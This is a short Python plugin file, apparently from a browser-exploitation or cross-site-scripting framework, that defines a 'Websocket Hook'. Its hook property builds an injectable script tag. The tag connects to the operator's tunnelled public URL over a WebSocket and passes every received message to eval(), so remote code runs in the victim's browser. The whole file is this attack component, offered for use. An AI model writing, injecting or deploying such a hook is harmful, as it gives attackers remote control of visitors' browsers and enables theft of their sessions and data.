from src.core.hooks import BaseHook


class Hook(BaseHook):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Default websocket hook. Loads payload code via WebSockets and executes in eval().'
    NAME = 'Websocket Hook'
    VERSION = '0.1'
    TRANSPORT = 'websocket'

    def __init__(self):
        self._public_url = None

    async def on_launched(self, environment):
        self._public_url = environment.settings.tunneling.public_url

    @property
    def hook(self) -> str:
        return f"<script>c=new WebSocket('{self._public_url}');c.onmessage=(e)=>eval(e.data);</script>"
